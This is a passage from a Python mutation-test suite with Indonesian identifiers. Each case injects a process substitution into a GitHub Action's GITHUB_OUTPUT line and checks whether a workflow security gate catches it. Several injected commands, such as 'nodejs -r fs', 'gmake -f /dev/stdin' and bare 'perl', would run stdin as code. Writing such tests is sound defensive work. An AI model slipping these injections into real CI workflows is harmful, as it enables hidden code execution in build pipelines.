                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru507 != isi_aksi507, \
            "suntikan aksi507 tidak menembak"
        with open(berkas_aksi507, "w", encoding="utf-8") as f:
            f.write(isi_baru507)
        rc, out = jalan(sub507, [sys.executable, GERBANG, "--semua"])
        periksa("gm identify -format - /tmp/p81.png: "
                "gerbang lolos (Audit 1284)", rc == 0)
        shutil.rmtree(sub507, ignore_errors=True)
        sub508 = klon(tmp, "sub508")
        berkas_aksi508 = os.path.join(
            sub508, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi508, encoding="utf-8") as f:
            isi_aksi508 = f.read()
        baris_aksi508 = [b for b in isi_aksi508.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru508 = isi_aksi508.replace(
                baris_aksi508,
                baris_aksi508.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gm convert - -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru508 != isi_aksi508, \
            "suntikan aksi508 tidak menembak"
        with open(berkas_aksi508, "w", encoding="utf-8") as f:
            f.write(isi_baru508)
        rc, out = jalan(sub508, [sys.executable, GERBANG, "--semua"])
        periksa("gm convert - -: "
                "gerbang gagal (Audit 1285)", rc != 0)
        shutil.rmtree(sub508, ignore_errors=True)
        sub509 = klon(tmp, "sub509")
        berkas_aksi509 = os.path.join(
            sub509, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi509, encoding="utf-8") as f:
            isi_aksi509 = f.read()
        baris_aksi509 = [b for b in isi_aksi509.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru509 = isi_aksi509.replace(
                baris_aksi509,
                baris_aksi509.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pr --separator - berkas.txt; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru509 != isi_aksi509, \
            "suntikan aksi509 tidak menembak"
        with open(berkas_aksi509, "w", encoding="utf-8") as f:
            f.write(isi_baru509)
        rc, out = jalan(sub509, [sys.executable, GERBANG, "--semua"])
        periksa("pr --separator - berkas.txt: "
                "gerbang gagal (Audit 1286)", rc != 0)
        shutil.rmtree(sub509, ignore_errors=True)
        sub510 = klon(tmp, "sub510")
        berkas_aksi510 = os.path.join(
            sub510, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi510, encoding="utf-8") as f:
            isi_aksi510 = f.read()
        baris_aksi510 = [b for b in isi_aksi510.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru510 = isi_aksi510.replace(
                baris_aksi510,
                baris_aksi510.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(json_pp -t json; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru510 != isi_aksi510, \
            "suntikan aksi510 tidak menembak"
        with open(berkas_aksi510, "w", encoding="utf-8") as f:
            f.write(isi_baru510)
        rc, out = jalan(sub510, [sys.executable, GERBANG, "--semua"])
        periksa("json_pp -t json: "
                "gerbang gagal (Audit 1287)", rc != 0)
        shutil.rmtree(sub510, ignore_errors=True)
        sub511 = klon(tmp, "sub511")
        berkas_aksi511 = os.path.join(
            sub511, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi511, encoding="utf-8") as f:
            isi_aksi511 = f.read()
        baris_aksi511 = [b for b in isi_aksi511.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru511 = isi_aksi511.replace(
                baris_aksi511,
                baris_aksi511.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(uconv -b 4096 -f UTF-8 -t UTF-8; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru511 != isi_aksi511, \
            "suntikan aksi511 tidak menembak"
        with open(berkas_aksi511, "w", encoding="utf-8") as f:
            f.write(isi_baru511)
        rc, out = jalan(sub511, [sys.executable, GERBANG, "--semua"])
        periksa("uconv -b 4096 -f UTF-8 -t UTF-8: "
                "gerbang gagal (Audit 1288)", rc != 0)
        shutil.rmtree(sub511, ignore_errors=True)
        sub512 = klon(tmp, "sub512")
        berkas_aksi512 = os.path.join(
            sub512, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi512, encoding="utf-8") as f:
            isi_aksi512 = f.read()
        baris_aksi512 = [b for b in isi_aksi512.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru512 = isi_aksi512.replace(
                baris_aksi512,
                baris_aksi512.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(piconv -S scheme -f utf8 -t utf8; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru512 != isi_aksi512, \
            "suntikan aksi512 tidak menembak"
        with open(berkas_aksi512, "w", encoding="utf-8") as f:
            f.write(isi_baru512)
        rc, out = jalan(sub512, [sys.executable, GERBANG, "--semua"])
        periksa("piconv -S scheme -f utf8 -t utf8: "
                "gerbang gagal (Audit 1289)", rc != 0)
        shutil.rmtree(sub512, ignore_errors=True)
        sub513 = klon(tmp, "sub513")
        berkas_aksi513 = os.path.join(
            sub513, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi513, encoding="utf-8") as f:
            isi_aksi513 = f.read()
        baris_aksi513 = [b for b in isi_aksi513.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru513 = isi_aksi513.replace(
                baris_aksi513,
                baris_aksi513.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pod2text -e utf8; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru513 != isi_aksi513, \
            "suntikan aksi513 tidak menembak"
        with open(berkas_aksi513, "w", encoding="utf-8") as f:
            f.write(isi_baru513)
        rc, out = jalan(sub513, [sys.executable, GERBANG, "--semua"])
        periksa("pod2text -e utf8: "
                "gerbang gagal (Audit 1290)", rc != 0)
        shutil.rmtree(sub513, ignore_errors=True)
        sub514 = klon(tmp, "sub514")
        berkas_aksi514 = os.path.join(
            sub514, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi514, encoding="utf-8") as f:
            isi_aksi514 = f.read()
        baris_aksi514 = [b for b in isi_aksi514.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru514 = isi_aksi514.replace(
                baris_aksi514,
                baris_aksi514.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(shasum -a 256; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru514 != isi_aksi514, \
            "suntikan aksi514 tidak menembak"
        with open(berkas_aksi514, "w", encoding="utf-8") as f:
            f.write(isi_baru514)
        rc, out = jalan(sub514, [sys.executable, GERBANG, "--semua"])
        periksa("shasum -a 256: "
                "gerbang gagal (Audit 1291)", rc != 0)
        shutil.rmtree(sub514, ignore_errors=True)
        sub515 = klon(tmp, "sub515")
        berkas_aksi515 = os.path.join(
            sub515, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi515, encoding="utf-8") as f:
            isi_aksi515 = f.read()
        baris_aksi515 = [b for b in isi_aksi515.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru515 = isi_aksi515.replace(
                baris_aksi515,
                baris_aksi515.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(xzcat --block-size 1MiB; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru515 != isi_aksi515, \
            "suntikan aksi515 tidak menembak"
        with open(berkas_aksi515, "w", encoding="utf-8") as f:
            f.write(isi_baru515)
        rc, out = jalan(sub515, [sys.executable, GERBANG, "--semua"])
        periksa("xzcat --block-size 1MiB: "
                "gerbang gagal (Audit 1292)", rc != 0)
        shutil.rmtree(sub515, ignore_errors=True)
        sub516 = klon(tmp, "sub516")
        berkas_aksi516 = os.path.join(
            sub516, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi516, encoding="utf-8") as f:
            isi_aksi516 = f.read()
        baris_aksi516 = [b for b in isi_aksi516.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru516 = isi_aksi516.replace(
                baris_aksi516,
                baris_aksi516.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(iptables-nft-restore -W 1000; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru516 != isi_aksi516, \
            "suntikan aksi516 tidak menembak"
        with open(berkas_aksi516, "w", encoding="utf-8") as f:
            f.write(isi_baru516)
        rc, out = jalan(sub516, [sys.executable, GERBANG, "--semua"])
        periksa("iptables-nft-restore -W 1000: "
                "gerbang gagal (Audit 1293)", rc != 0)
        shutil.rmtree(sub516, ignore_errors=True)
        sub517 = klon(tmp, "sub517")
        berkas_aksi517 = os.path.join(
            sub517, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi517, encoding="utf-8") as f:
            isi_aksi517 = f.read()
        baris_aksi517 = [b for b in isi_aksi517.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru517 = isi_aksi517.replace(
                baris_aksi517,
                baris_aksi517.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(numfmt --round up; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru517 != isi_aksi517, \
            "suntikan aksi517 tidak menembak"
        with open(berkas_aksi517, "w", encoding="utf-8") as f:
            f.write(isi_baru517)
        rc, out = jalan(sub517, [sys.executable, GERBANG, "--semua"])
        periksa("numfmt --round up: "
                "gerbang gagal (Audit 1294)", rc != 0)
        shutil.rmtree(sub517, ignore_errors=True)
        sub518 = klon(tmp, "sub518")
        berkas_aksi518 = os.path.join(
            sub518, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi518, encoding="utf-8") as f:
            isi_aksi518 = f.read()
        baris_aksi518 = [b for b in isi_aksi518.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru518 = isi_aksi518.replace(
                baris_aksi518,
                baris_aksi518.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(uclampset -M 0 cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru518 != isi_aksi518, \
            "suntikan aksi518 tidak menembak"
        with open(berkas_aksi518, "w", encoding="utf-8") as f:
            f.write(isi_baru518)
        rc, out = jalan(sub518, [sys.executable, GERBANG, "--semua"])
        periksa("uclampset -M 0 cat: "
                "gerbang gagal (Audit 1295)", rc != 0)
        shutil.rmtree(sub518, ignore_errors=True)
        sub519 = klon(tmp, "sub519")
        berkas_aksi519 = os.path.join(
            sub519, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi519, encoding="utf-8") as f:
            isi_aksi519 = f.read()
        baris_aksi519 = [b for b in isi_aksi519.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru519 = isi_aksi519.replace(
                baris_aksi519,
                baris_aksi519.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(choom -p 999999 cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru519 != isi_aksi519, \
            "suntikan aksi519 tidak menembak"
        with open(berkas_aksi519, "w", encoding="utf-8") as f:
            f.write(isi_baru519)
        rc, out = jalan(sub519, [sys.executable, GERBANG, "--semua"])
        periksa("choom -p 999999 cat: "
                "gerbang lolos (Audit 1296)", rc == 0)
        shutil.rmtree(sub519, ignore_errors=True)
        sub520 = klon(tmp, "sub520")
        berkas_aksi520 = os.path.join(
            sub520, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi520, encoding="utf-8") as f:
            isi_aksi520 = f.read()
        baris_aksi520 = [b for b in isi_aksi520.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru520 = isi_aksi520.replace(
                baris_aksi520,
                baris_aksi520.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(xvfb-run -p MIT-MAGIC-COOKIE-1 cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru520 != isi_aksi520, \
            "suntikan aksi520 tidak menembak"
        with open(berkas_aksi520, "w", encoding="utf-8") as f:
            f.write(isi_baru520)
        rc, out = jalan(sub520, [sys.executable, GERBANG, "--semua"])
        periksa("xvfb-run -p MIT-MAGIC-COOKIE-1 cat: "
                "gerbang gagal (Audit 1297)", rc != 0)
        shutil.rmtree(sub520, ignore_errors=True)
        sub521 = klon(tmp, "sub521")
        berkas_aksi521 = os.path.join(
            sub521, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi521, encoding="utf-8") as f:
            isi_aksi521 = f.read()
        baris_aksi521 = [b for b in isi_aksi521.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru521 = isi_aksi521.replace(
                baris_aksi521,
                baris_aksi521.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(linux64 --list cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru521 != isi_aksi521, \
            "suntikan aksi521 tidak menembak"
        with open(berkas_aksi521, "w", encoding="utf-8") as f:
            f.write(isi_baru521)
        rc, out = jalan(sub521, [sys.executable, GERBANG, "--semua"])
        periksa("linux64 --list cat: "
                "gerbang lolos (Audit 1298)", rc == 0)
        shutil.rmtree(sub521, ignore_errors=True)
        sub522 = klon(tmp, "sub522")
        berkas_aksi522 = os.path.join(
            sub522, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi522, encoding="utf-8") as f:
            isi_aksi522 = f.read()
        baris_aksi522 = [b for b in isi_aksi522.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru522 = isi_aksi522.replace(
                baris_aksi522,
                baris_aksi522.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(nodejs -r fs; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru522 != isi_aksi522, \
            "suntikan aksi522 tidak menembak"
        with open(berkas_aksi522, "w", encoding="utf-8") as f:
            f.write(isi_baru522)
        rc, out = jalan(sub522, [sys.executable, GERBANG, "--semua"])
        periksa("nodejs -r fs: "
                "gerbang gagal (Audit 1299)", rc != 0)
        shutil.rmtree(sub522, ignore_errors=True)
        sub523 = klon(tmp, "sub523")
        berkas_aksi523 = os.path.join(
            sub523, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi523, encoding="utf-8") as f:
            isi_aksi523 = f.read()
        baris_aksi523 = [b for b in isi_aksi523.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru523 = isi_aksi523.replace(
                baris_aksi523,
                baris_aksi523.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gmake -f /dev/stdin; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru523 != isi_aksi523, \
            "suntikan aksi523 tidak menembak"
        with open(berkas_aksi523, "w", encoding="utf-8") as f:
            f.write(isi_baru523)
        rc, out = jalan(sub523, [sys.executable, GERBANG, "--semua"])
        periksa("gmake -f /dev/stdin: "
                "gerbang gagal (Audit 1300)", rc != 0)
        shutil.rmtree(sub523, ignore_errors=True)
        sub524 = klon(tmp, "sub524")
        berkas_aksi524 = os.path.join(
            sub524, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi524, encoding="utf-8") as f:
            isi_aksi524 = f.read()
        baris_aksi524 = [b for b in isi_aksi524.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru524 = isi_aksi524.replace(
                baris_aksi524,
                baris_aksi524.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(perl5.38.2; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru524 != isi_aksi524, \
            "suntikan aksi524 tidak menembak"
        with open(berkas_aksi524, "w", encoding="utf-8") as f:
            f.write(isi_baru524)
        rc, out = jalan(sub524, [sys.executable, GERBANG, "--semua"])
        periksa("perl5.38.2: "
                "gerbang gagal (Audit 1301)", rc != 0)
        shutil.rmtree(sub524, ignore_errors=True)
        sub525 = klon(tmp, "sub525")
        berkas_aksi525 = os.path.join(
            sub525, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi525, encoding="utf-8") as f:
            isi_aksi525 = f.read()
        baris_aksi525 = [b for b in isi_aksi525.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru525 = isi_aksi525.replace(
                baris_aksi525,
                baris_aksi525.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cpp; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru525 != isi_aksi525, \
            "suntikan aksi525 tidak menembak"
        with open(berkas_aksi525, "w", encoding="utf-8") as f:
            f.write(isi_baru525)
        rc, out = jalan(sub525, [sys.executable, GERBANG, "--semua"])
        periksa("cpp: "
                "gerbang gagal (Audit 1302)", rc != 0)
        shutil.rmtree(sub525, ignore_errors=True)
        sub526 = klon(tmp, "sub526")
        berkas_aksi526 = os.path.join(
            sub526, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi526, encoding="utf-8") as f:
            isi_aksi526 = f.read()
        baris_aksi526 = [b for b in isi_aksi526.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru526 = isi_aksi526.replace(
                baris_aksi526,
                baris_aksi526.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gcc -x c -E -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru526 != isi_aksi526, \
            "suntikan aksi526 tidak menembak"
        with open(berkas_aksi526, "w", encoding="utf-8") as f:
            f.write(isi_baru526)
        rc, out = jalan(sub526, [sys.executable, GERBANG, "--semua"])
        periksa("gcc -x c -E -: "
                "gerbang gagal (Audit 1303)", rc != 0)
        shutil.rmtree(sub526, ignore_errors=True)
        sub527 = klon(tmp, "sub527")
        berkas_aksi527 = os.path.join(
            sub527, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi527, encoding="utf-8") as f:
            isi_aksi527 = f.read()
        baris_aksi527 = [b for b in isi_aksi527.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru527 = isi_aksi527.replace(
                baris_aksi527,
                baris_aksi527.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(as -o out -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru527 != isi_aksi527, \
            "suntikan aksi527 tidak menembak"
        with open(berkas_aksi527, "w", encoding="utf-8") as f:
            f.write(isi_baru527)
        rc, out = jalan(sub527, [sys.executable, GERBANG, "--semua"])
        periksa("as -o out -: "
                "gerbang gagal (Audit 1304)", rc != 0)
        shutil.rmtree(sub527, ignore_errors=True)
        sub528 = klon(tmp, "sub528")
        berkas_aksi528 = os.path.join(
            sub528, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi528, encoding="utf-8") as f:
            isi_aksi528 = f.read()
        baris_aksi528 = [b for b in isi_aksi528.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru528 = isi_aksi528.replace(
                baris_aksi528,
                baris_aksi528.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(zcmp - -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru528 != isi_aksi528, \
            "suntikan aksi528 tidak menembak"
        with open(berkas_aksi528, "w", encoding="utf-8") as f:
            f.write(isi_baru528)
        rc, out = jalan(sub528, [sys.executable, GERBANG, "--semua"])
        periksa("zcmp - -: "
                "gerbang gagal (Audit 1305)", rc != 0)
        shutil.rmtree(sub528, ignore_errors=True)
        sub529 = klon(tmp, "sub529")
        berkas_aksi529 = os.path.join(
            sub529, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi529, encoding="utf-8") as f:
            isi_aksi529 = f.read()
        baris_aksi529 = [b for b in isi_aksi529.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru529 = isi_aksi529.replace(
                baris_aksi529,
                baris_aksi529.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(zegrep UTUH; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru529 != isi_aksi529, \
            "suntikan aksi529 tidak menembak"
        with open(berkas_aksi529, "w", encoding="utf-8") as f:
            f.write(isi_baru529)
        rc, out = jalan(sub529, [sys.executable, GERBANG, "--semua"])
        periksa("zegrep UTUH: "
                "gerbang gagal (Audit 1306)", rc != 0)
        shutil.rmtree(sub529, ignore_errors=True)
        sub530 = klon(tmp, "sub530")
        berkas_aksi530 = os.path.join(
            sub530, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi530, encoding="utf-8") as f:
            isi_aksi530 = f.read()
        baris_aksi530 = [b for b in isi_aksi530.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru530 = isi_aksi530.replace(
                baris_aksi530,
                baris_aksi530.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(bzegrep UTUH; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru530 != isi_aksi530, \
            "suntikan aksi530 tidak menembak"
        with open(berkas_aksi530, "w", encoding="utf-8") as f:
            f.write(isi_baru530)
        rc, out = jalan(sub530, [sys.executable, GERBANG, "--semua"])
        periksa("bzegrep UTUH: "
                "gerbang gagal (Audit 1307)", rc != 0)
        shutil.rmtree(sub530, ignore_errors=True)
        sub531 = klon(tmp, "sub531")
        berkas_aksi531 = os.path.join(
            sub531, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi531, encoding="utf-8") as f:
            isi_aksi531 = f.read()
        baris_aksi531 = [b for b in isi_aksi531.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru531 = isi_aksi531.replace(
                baris_aksi531,
                baris_aksi531.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(xzcmp - -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru531 != isi_aksi531, \
            "suntikan aksi531 tidak menembak"
        with open(berkas_aksi531, "w", encoding="utf-8") as f:
            f.write(isi_baru531)
        rc, out = jalan(sub531, [sys.executable, GERBANG, "--semua"])
        periksa("xzcmp - -: "
                "gerbang gagal (Audit 1308)", rc != 0)
        shutil.rmtree(sub531, ignore_errors=True)
        sub532 = klon(tmp, "sub532")
        berkas_aksi532 = os.path.join(
            sub532, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi532, encoding="utf-8") as f:
            isi_aksi532 = f.read()
        baris_aksi532 = [b for b in isi_aksi532.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru532 = isi_aksi532.replace(
                baris_aksi532,
                baris_aksi532.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(lzcmp - -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru532 != isi_aksi532, \
            "suntikan aksi532 tidak menembak"
        with open(berkas_aksi532, "w", encoding="utf-8") as f:
            f.write(isi_baru532)
        rc, out = jalan(sub532, [sys.executable, GERBANG, "--semua"])
        periksa("lzcmp - -: "
                "gerbang gagal (Audit 1309)", rc != 0)
        shutil.rmtree(sub532, ignore_errors=True)
        sub533 = klon(tmp, "sub533")
        berkas_aksi533 = os.path.join(
            sub533, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi533, encoding="utf-8") as f:
            isi_aksi533 = f.read()
        baris_aksi533 = [b for b in isi_aksi533.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru533 = isi_aksi533.replace(
                baris_aksi533,
                baris_aksi533.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(uncompress; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru533 != isi_aksi533, \
            "suntikan aksi533 tidak menembak"
        with open(berkas_aksi533, "w", encoding="utf-8") as f:
            f.write(isi_baru533)
        rc, out = jalan(sub533, [sys.executable, GERBANG, "--semua"])
        periksa("uncompress: "
                "gerbang gagal (Audit 1310)", rc != 0)
        shutil.rmtree(sub533, ignore_errors=True)
        sub534 = klon(tmp, "sub534")
        berkas_aksi534 = os.path.join(
            sub534, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi534, encoding="utf-8") as f:
            isi_aksi534 = f.read()
        baris_aksi534 = [b for b in isi_aksi534.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru534 = isi_aksi534.replace(
                baris_aksi534,
                baris_aksi534.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(cmp berkas -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru534 != isi_aksi534, \
            "suntikan aksi534 tidak menembak"
        with open(berkas_aksi534, "w", encoding="utf-8") as f:
            f.write(isi_baru534)
        rc, out = jalan(sub534, [sys.executable, GERBANG, "--semua"])
        periksa("cmp berkas -: "
                "gerbang gagal (Audit 1311)", rc != 0)
        shutil.rmtree(sub534, ignore_errors=True)
        sub535 = klon(tmp, "sub535")
        berkas_aksi535 = os.path.join(
            sub535, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi535, encoding="utf-8") as f:
            isi_aksi535 = f.read()
        baris_aksi535 = [b for b in isi_aksi535.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru535 = isi_aksi535.replace(
                baris_aksi535,
                baris_aksi535.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(ptar -t -f -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru535 != isi_aksi535, \
            "suntikan aksi535 tidak menembak"
        with open(berkas_aksi535, "w", encoding="utf-8") as f:
            f.write(isi_baru535)
        rc, out = jalan(sub535, [sys.executable, GERBANG, "--semua"])
        periksa("ptar -t -f -: "
                "gerbang gagal (Audit 1312)", rc != 0)
        shutil.rmtree(sub535, ignore_errors=True)
        sub536 = klon(tmp, "sub536")
        berkas_aksi536 = os.path.join(
            sub536, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi536, encoding="utf-8") as f:
            isi_aksi536 = f.read()
        baris_aksi536 = [b for b in isi_aksi536.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru536 = isi_aksi536.replace(
                baris_aksi536,
                baris_aksi536.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(streamzip; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru536 != isi_aksi536, \
            "suntikan aksi536 tidak menembak"
        with open(berkas_aksi536, "w", encoding="utf-8") as f:
            f.write(isi_baru536)
        rc, out = jalan(sub536, [sys.executable, GERBANG, "--semua"])
        periksa("streamzip: "
                "gerbang gagal (Audit 1313)", rc != 0)
        shutil.rmtree(sub536, ignore_errors=True)
        sub537 = klon(tmp, "sub537")
        berkas_aksi537 = os.path.join(
            sub537, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi537, encoding="utf-8") as f:
            isi_aksi537 = f.read()
        baris_aksi537 = [b for b in isi_aksi537.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru537 = isi_aksi537.replace(
                baris_aksi537,
                baris_aksi537.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(zless; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru537 != isi_aksi537, \
            "suntikan aksi537 tidak menembak"
        with open(berkas_aksi537, "w", encoding="utf-8") as f:
            f.write(isi_baru537)
        rc, out = jalan(sub537, [sys.executable, GERBANG, "--semua"])
        periksa("zless: "
                "gerbang gagal (Audit 1314)", rc != 0)
        shutil.rmtree(sub537, ignore_errors=True)
        sub538 = klon(tmp, "sub538")
        berkas_aksi538 = os.path.join(
            sub538, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi538, encoding="utf-8") as f:
            isi_aksi538 = f.read()
        baris_aksi538 = [b for b in isi_aksi538.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru538 = isi_aksi538.replace(
                baris_aksi538,
                baris_aksi538.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(sensible-pager; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru538 != isi_aksi538, \
            "suntikan aksi538 tidak menembak"
        with open(berkas_aksi538, "w", encoding="utf-8") as f:
            f.write(isi_baru538)
        rc, out = jalan(sub538, [sys.executable, GERBANG, "--semua"])
        periksa("sensible-pager: "
                "gerbang gagal (Audit 1315)", rc != 0)
        shutil.rmtree(sub538, ignore_errors=True)
        sub539 = klon(tmp, "sub539")
        berkas_aksi539 = os.path.join(
            sub539, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi539, encoding="utf-8") as f:
            isi_aksi539 = f.read()
        baris_aksi539 = [b for b in isi_aksi539.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru539 = isi_aksi539.replace(
                baris_aksi539,
                baris_aksi539.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(vim.tiny -n; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru539 != isi_aksi539, \
            "suntikan aksi539 tidak menembak"
        with open(berkas_aksi539, "w", encoding="utf-8") as f:
            f.write(isi_baru539)
        rc, out = jalan(sub539, [sys.executable, GERBANG, "--semua"])
        periksa("vim.tiny -n: "
